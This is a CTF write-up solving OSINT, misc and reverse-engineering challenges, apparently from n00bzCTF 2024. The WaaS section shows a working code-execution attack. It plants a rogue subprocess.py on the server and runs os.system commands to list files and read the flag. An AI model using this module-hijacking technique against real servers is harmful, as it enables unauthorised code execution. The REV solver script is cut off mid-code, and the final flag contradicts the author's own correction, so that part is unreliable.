This CTF was quite fun as there were a lot of accessible challenges with only a few that were brainf*. Yes, it was perfect for n00bz.

Here are some interesting challenges I managed to complete:

## [OSINT] **Tail**

> Here's a picture of a plane's tail. Can you
find the airline's hub (the airport where they mostly operate from). 
Use the three letter airport IATA code and wrap it in n00bz{}. Example: `n00bz{SFO}`.

For this challenge we are given an image of a plane tail:

![Untitled](Untitled.jpeg)

This image had no EXIF and GLens did not work well with it, so I tried other approach. I searched up “databases” of plane tails and found this: [https://airlinersgallery.smugmug.com/Airline-Tails/Airline-Tails](https://airlinersgallery.smugmug.com/Airline-Tails/Airline-Tails). This page had tails from all around the world so I took a look.

Finally, I found a similar tail ([https://airlinersgallery.smugmug.com/Airline-Tails/Airline-Tails/i-WVJ232z](https://airlinersgallery.smugmug.com/Airline-Tails/Airline-Tails/i-WVJ232z)), which revealed the airline: Air Tahiti Nui.

With this, the only thing left was to find the hub. With a simple check in the Wikipedia page of the airline ([https://en.wikipedia.org/wiki/Air_Tahiti_Nui](https://en.wikipedia.org/wiki/Air_Tahiti_Nui))  I found it: Faa'a International Airport → PPT

FLAG: `n00bz{PPT}`

## **[OSINT] Pastebin**

> Just go to my pastebin which was created long time back.
>
> `https://pastebin.com/j1UnKA7m`
> 

The provided pastebin contained no information at the time of visiting it:

![Untitled](Untitled.png)

However, the description said: *was created long time back.* So I went to [archive.org](http://archive.org) and searched the same page, which had been archived some days ago:

[https://web.archive.org/web/20240617125911/https://pastebin.com/j1UnKA7m](https://web.archive.org/web/20240617125911/https://pastebin.com/j1UnKA7m)

Here, the content of the pastebin was available, which was the flag:

![Untitled](Untitled%201.png)

FLAG: `n00bz{l0ng_t1m3_ag0_m34ns_w4yb4ck}`

## **[OSINT] PastebinX**

> All I need is the User ID said the boss. Help the poor employee to find the id. Flag format - `n00bz{1d_}`. If id is "hhjkh876897" then flag will be `n00bz{1d_hhjkh876897}`.

> Note - see Pastebin for name
> 

This challenge was related with the previous pastebin. There, there was a comment that mentioned an username: `for part 2 - @Abhinav7808293`.

With this username I began searching his profile. I finally found its X profile: [https://x.com/Abhinav78082932](https://x.com/Abhinav78082932). This made sense as the title was PastebinX.

As an ID was needed, I retrieved its X ID with [https://ilo.so/twitter-id/](https://ilo.so/twitter-id/): 1596757063039799297. Finally, I applied the format and submitted the flag.

FLAG: `n00bz{1d_1596757063039799297}`

## [OSINT] The Gang

> John Doe has been suspected of creating a gang. The members of team n00bzUnit3d also seem associated with it. Can you find out if John Doe has recently joined the team? You might find what you are looking for ;) P.S.: The team website might help. Author: NoobMaster
> 

For this first challenge of the series I accessed the team page: [https://n00bzunit3d.xyz/](https://n00bzunit3d.xyz/). As the challenge mentioned a member, I looked the *Members* section, where I found John Doe’s profile: [https://n00bzunit3d.xyz/authors/johndoe](https://n00bzunit3d.xyz/authors/johndoe). This page contained the flag:

![Untitled](Untitled%202.png)

FLAG: `n00bz{1ts_051N7_71m3_3e4a7d6f}`

## [OSINT] The Gang 2

> You may have gotten your first flag, but 
it's just the beginning! John Doe, as overconfident as he is, has left 
you with a riddle. Maybe it hides some secrets? Continue where you left 
off last time. Flag will already by wrapped in `n00bz{}`
Author: NoobMaster
> 

In the last page of the previous challenge, an article made by John was listed: [https://n00bzunit3d.xyz/blog/who-am-i/](https://n00bzunit3d.xyz/blog/who-am-i/). Here, the following poem is posted:

```python
Underneath the surface, secrets lie.
Stories untold, hidden from the eye.
Every question leads to more unknown.
Real mysteries, only few are shown.
Never revealing, always concealed.
A hidden truth, never revealed.
Many have searched, but none have found.
Every clue, like whispers, sound.

In the shadows, I silently stand.
Secrets I keep, like grains of sand.

Just a glimpse, you might get to see.
Only hints, no certainty.
Hidden pathways, a cryptic code.
Navigating through the winding road.

Have you the wit to break this scheme?
Answers lie beyond the dream.
Codes and puzzles, all intertwined.
Knowledge and wisdom, together aligned.
Every detail, a piece to decode.
Remember, persistence will lighten the load.

Do you have what it takes to unveil?
Only the cleverest will prevail.
Enter the realm of the unknown.
```

The hint here resides in the first character of each line, from where it can be extracted the string: `USERNAMEISJOHNHACKERDOE`.

From here, I went to X and found his profile ([https://x.com/johnhackerdoe](https://x.com/johnhackerdoe)), which had the flag published.

FLAG: `n00bz{5t0p_ch4s1ng_m3_4f2d1a7d}`

## [OSINT] The Gang 3

> Can you find out where the OG meetup point is? The flag is in the format `n00bz{lat,long}` with upto 3 decimal places, rounded. Continue where you left off... Note: Wikipedia can be wrong sometimes ;)
Author: NoobMaster
> 

In his X account, I found an interesting post:

> Wanna join us? I have a challenge for you:
>
> The ciphertext (using AES-GCM) is: 1762841d1888f6b02581990abdf0aaba375c85fd3811a6fb405775fb8d + the key is the same as last time and the IV is "Lat,Long" up to 3 decimal places. Use the city where we met in 2022. Also, use Cyberchef.
>
> I forgot, you will also need this: d5e749da6b02c75cb4c763939632503a
> 

To extract the cleartext I had to search up the password from “old times”, so I took a look at the writeups from the last years and found that the password `YouCanNeverCatchJohnDoe!` was used the last year ([https://github.com/n00bzUnit3d/n00bzCTF2023-OfficalWriteups/tree/master/OSINT/John Doe Strikes Again](https://github.com/n00bzUnit3d/n00bzCTF2023-OfficalWriteups/tree/master/OSINT/John%20Doe%20Strikes%20Again)).

Also, I needed the IV, which was a location from “a city where we met in 2022”. So, again, I searched in the challenges from 2022 and found the coordinates in one of them ([https://github.com/n00bzUnit3d/n00bzCTF-OfficialWriteups/blob/main/osint/john_doe/README.md](https://github.com/n00bzUnit3d/n00bzCTF-OfficialWriteups/blob/main/osint/john_doe/README.md)): `46.720,33.154`.

Lastly I went to CyberChef and added all the parameters in the AES-GCM function:

- The ciphertext: `1762841d1888f6b02581990abdf0aaba375c85fd3811a6fb405775fb8d`.
- The Key: `YouCanNeverCatchJohnDoe!`.
- The IV: `46.720,33.154`.
- The GCM Tag: `d5e749da6b02c75cb4c763939632503a`.

The output was the following Discord link: [https://discord.gg/9v2FEjndCb](https://discord.gg/9v2FEjndCb). It was a group where John Doe and his friends were talking about a meeting:

> Bro Bengaluru is a literal paradise compared to Delhi
>
> Can't wait to get there bro…
>
> We meeting near the statue right?
>
> That statue is about 110 feet tall
>
> The airport is named after the person depicted in the statue
> 

With this information I searched up `bengaluru airport statue` and found the site: [https://en.wikipedia.org/wiki/Statue_of_Prosperity](https://en.wikipedia.org/wiki/Statue_of_Prosperity).

As the challenge mentioned that Wikipedia was wrong, I searched it in GMaps and copied the coordinates: [https://maps.app.goo.gl/pJeMwpuGGPhJ2o7c9](https://maps.app.goo.gl/pJeMwpuGGPhJ2o7c9).

FLAG: `n00bz{13.199,77.682}`

## [OSINT] The Gang 4

> Can you find more information about his flight? Time to close John Doe's case one and for all!
Author: NoobMaster
Note: Flag format: 
`n00bz{DateOfFlight(DD/MM/YYYY)_FlightNumber_IATAairportCodeOfDeparture_IATAairportCodeofArrival_ACTUALtimeOfDeparture_ACTUALtimeOfArrival_GateofDeparture_AirplaneModel}`
Example: `n00bz{26/06/2024_AA1337_DFW_SFO_13:37_15:51_32A_AirbusA319-400}`
Please use the above format to format your flag.
> 

For this challenge, almost all the information was in the group chat:

> At least it does rain lol, Delhi is soo hoot dude. Just started raining recently so hopefully gets better
> 

The flight is from Delhi to Bengaluru → DEL-BLR

> 9:40 am in the morning is the scheduled time, but nowadays flights are always getting delayed **[…]**
>
> lands around 1, so probably 1:30ish
> 

The flight departs around 9:40 and arrives around 13:00.

> Air India food is so 🔥
> 

The airline is Air India.

> The flight's tomorrow 👀
> 

As the message was sent the 02/08, the flight should be the 03/08 → 03/08/2024.

With this information I found the flight in FlightRadar24 ([https://www.flightradar24.com/data/flights/ai506#36753031](https://www.flightradar24.com/data/flights/ai506#36753031)):

![Untitled](Untitled%203.png)

However, I was missing the gate of departure. So I searched in the page of the airline and found the flight and the gate ([https://www.airindia.com/in/en/manage/flight-status.html?fno=506&on=20240803](https://www.airindia.com/in/en/manage/flight-status.html?fno=506&on=20240803)): 

![Untitled](Untitled%204.png)

Now I had the gate: 30.

With this information mainly from RF24 I crafted the following flag: `n00bz{03/08/2024_AI506_DEL_BLR_10:18_12:33_30_AirbusA350-941}`. However, it was not the correct one.

Here I noticed that the information in RF24 and the page of the airline was not the same. So this time I crafted the flag with the information from the airline, which finally worked. 

Here it is the comparison between the two flags:

- RF24 sourced: [https://www.flightradar24.com/data/flights/ai506#36753031](https://www.flightradar24.com/data/flights/ai506#36753031):

```
n00bz{03/08/2024_AI506_DEL_BLR_10:18_12:33_30_AirbusA350-941}
```

- Air India sourced (correct one): [https://www.airindia.com/in/en/manage/flight-status.html?fno=506&on=20240803](https://www.airindia.com/in/en/manage/flight-status.html?fno=506&on=20240803)

```html
n00bz{03/08/2024_AI506_DEL_BLR_10:03_12:44_30_AirbusA350-900}
```

FLAG: `n00bz{03/08/2024_AI506_DEL_BLR_10:03_12:44_30_AirbusA350-900}`

## [MISC] **WaaS**

> Writing as a Service! Author: NoobMaster + NoobHacker.  Instance: *

> Files: chall.py
> 

We are given the code running on the server:

```python
import subprocess
from base64 import b64decode as d
while True:
	print("[1] Write to a file\n[2] Get the flag\n[3] Exit")
	try:
		inp = int(input("Choice: ").strip())
	except:
		print("Invalid input!")
		exit(0)
	if inp == 1:
		file = input("Enter file name: ").strip()
		assert file.count('.') <= 2 # Why do you need more?
		assert "/proc" not in file # Why do you need to write there?
		assert "/bin" not in file # Why do you need to write there? 
		assert "\n" not in file # Why do you need these?
		assert "chall" not in file # Don't be overwriting my files!
		try: 
			f = open(file,'w')
		except:
			print("Error! Maybe the file does not exist?")

		f.write(input("Data: ").strip())
		f.close()
		print("Data written sucessfully!")
		
	if inp == 2:
		flag = subprocess.run(["cat","fake_flag.txt"],capture_output=True) # You actually thought I would give the flag?
		print(flag.stdout.strip())
```

The program let us write any file and read a fake flag, so I tried to rewrite the program file and create an alias for cat, but none of that worked.  

Next, focused on the `import` sentences: `base64` was not used, why was it there then? (it was a hint?). So I began to try with some module overriding techniques, as Python prioritises modules on the same folder rather than the installed ones.

Here I tried locally first with the `base64` module, but it didn’t worked, so I switched to `subprocess`. This time, by creating a `subprocess.py` file, the program took the file as the `subprocess` module, achieving the execution of the code in the program. 

After this, I switched to online with a simple test to try to find the flag:

```
└─$ nc challs.n00bzunit3d.xyz 10357
[1] Write to a file
[2] Get the flag
[3] Exit
Choice: 1
Enter file name: subprocess.py
Data: import os; os.system("ls -la");
Data written sucessfully!
...
└─$ nc challs.n00bzunit3d.xyz 10357
total 88
...
-r--r--r--    1 root     root            52 Aug  4 13:43 flag.txt
...

```

The code worked as intended and now I knew the flag location, so I changed the code and retrieved it:

```
...
[1] Write to a file
[2] Get the flag
[3] Exit
Choice: 1
Enter file name: subprocess.py
Data: import os; os.system("cat /flag.txt");
Data written sucessfully!
...
└─$ nc challs.n00bzunit3d.xyz 10357
n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!_fa5e3763f6a8}
...
```

FLAG: `n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!_fa5e3763f6a8}`

## [REV] FlagChecker

> Why did the macros hide its knowledge? Because it didn't want anyone to "excel"! Note: `char_21` is the SAME as `char_22`
Note 2: The correct flag has ALL LOWERCASE, NUMBERS, `n00bz{}` AND UNDERSCORES (There's two underscores in the entire flag)
Author: NoobMaster

For this challenge we are given an EXCEL file that contains some macro inside. This has a series of checks that verify if the flag has been correctly inserted:

```vbnet
Option VBASupport 1
Sub FlagChecker()

    Dim chars(1 To 24) As String
    guess = InputBox("Enter the flag:")
    If Len(guess) <> 24 Then
        MsgBox "Nope"
    End If
    char_1 = Mid(guess, 1, 1)
    char_2 = Mid(guess, 2, 1)
...
   If (Asc(char_1) Xor Asc(char_8)) = 22 Then
        If (Asc(char_10) + Asc(char_24)) = 176 Then
            If (Asc(char_9) - Asc(char_22)) = -9 Then
                If (Asc(char_22) Xor Asc(char_6)) = 23 Then
                    If ((Asc(char_12) / 5) ^ (Asc(char_3) / 12)) = 130321 Then
                        If (char_22 = char_11) Then
                            If (Asc(char_15) * Asc(char_8)) = 14040 Then
                                If (Asc(char_12) Xor (Asc(char_17) - 5)) = 5 Then
                                    If (Asc(char_18) = Asc(char_23)) Then
                                        If (Asc(char_13) Xor Asc(char_14) Xor Asc(char_2)) = 121 Then
                                            If (Asc(char_14) Xor Asc(char_24)) = 77 Then
                                                If 1365 = (Asc(char_22) Xor 1337) Then
                                                    If (Asc(char_10) = Asc(char_7)) Then
                                                        If (Asc(char_23) + Asc(char_8)) = 235 Then
                                                            If Asc(char_16) = (Asc(char_17) + 19) Then
                                                                If (Asc(char_19)) = 107 Then
                                                                    If (Asc(char_20) + 501) = (Asc(char_1) * 5) Then
                                                                        If (Asc(char_21) = Asc(char_22)) Then
                                                                            MsgBox "you got the flag!"
...
```

As I didn’t want to touch VB, I translated this conditions to Python and performed some bruteforce with the characters specified by the challenge:

```python
# flag alphabet
alphabet = "0123456789abcdefghijklmnopqrstuvwxyz-_*#$&@"

solution = [None]*24
# already known flag part:
solution[0] = 'n'
solution[1] = '0'
solution[2] = '0'
solution[3] = 'b'
solution[4] = 'z'
solution[5] = '{'
solution[23] = '}'
print (f"Solution: {solution}")

# the if statements and position being checked + the result (that could included in the lambda i know)
comprobations = [
    [lambda x, y, z: x^y==z, 0, 7, 22],
    [lambda x, y, z: x+y==z, 9, 23, 176],

The output of this is `n00bz{3xc33_y0ur_sk1lls}`, which can be easily guessed to be `n00bz{3xc3l_y0ur_sk1lls}` (I probably missed some check).

FLAG: `n00bz{3xc33_y0ur_sk1lls}`
